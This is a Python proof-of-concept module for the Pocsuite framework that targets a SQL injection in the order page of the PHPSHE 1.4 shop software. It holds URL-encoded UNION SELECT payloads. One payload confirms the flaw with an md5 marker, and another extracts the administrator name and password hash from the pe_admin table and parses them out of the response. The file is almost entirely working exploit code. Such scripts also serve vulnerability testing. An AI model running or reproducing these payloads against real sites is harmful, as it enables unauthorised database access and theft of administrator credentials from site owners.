#!/usr/bin/env python
# coding:utf-8

from pocsuite.lib.core.poc import Output, POCBase
from pocsuite.lib.core.register import registerPoc as register
from pocsuite.lib.request.basic import req
from pocsuite.lib.core.data import logger
from pocsuite.lib.core.enums import CUSTOM_LOGGING
import urlparse
import re

class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Gump']
    vulDate = ''
    createDate = '2016-01-24'
    updateDate = '2016-01-24'
    references = ['http://www.wooyun.org/bugs/wooyun-2015-0141457']
    name = 'PHPSHE 1.4 /www/module/user/order.php SQL注入 POC'
    appPowerLink = 'http://www.phpshe.com/'
    appName = 'PHPSHE'
    appVersion = '1.4'
    vulType = 'SQL injection'
    desc = '''
    PHPSHE 1.4 在/www/module/user/order.php中对参数过滤不严导致SQL注入
    '''

    def check_argv(self):
        logger.log(CUSTOM_LOGGING.WARNING,u"注意，需要登录后的cookie")
        if self.headers['Cookie']:
            logger.log(CUSTOM_LOGGING.WARNING,u"请确保cookie正确")
            return True
        else:
            logger.log(CUSTOM_LOGGING.WARNING,u"请提交登录后的cookie")
            return False

    def _attack(self):
        if self.check_argv():
            result = {}
            payload = "?mod=order&state=11111111%27%20UNION%20SELECT%20(select%20concat(char(45,45,45),admin_name,char(45,45,45),admin_pw,char(45,45,45))%20from%20pe_admin%20limit%201),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28%23"
            vulurl = urlparse.urljoin(self.url,'user.php' + payload)
            resp = req.get(vulurl)
            if resp.status_code == 200:
                match_result = re.search(r'---(.+)---(.+)---',resp.content,re.I | re.M)
                if match_result:
                    result['AdminInfo'] = {}
                    result['AdminInfo']['Username'] = match_result.group(1)
                    result['AdminInfo']['Password'] = match_result.group(2)
            return self.parse_attack(result)

    def _verify(self):
        if self.check_argv():
            result = {}
            payload = "?mod=order&state=11111111%27%20UNION%20SELECT%20(select%20concat(floor(rand(0)*2),md5(1))%20from%20pe_admin%20limit%201),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28%23"
            vulurl = urlparse.urljoin(self.url,'user.php' + payload)
            resp = req.get(vulurl)
            if resp.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = urlparse.urljoin(self.url,'user.php')
                result['VerifyInfo']['Payload'] = payload
            return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Nothon returned')
        return output

register(TestPOC)
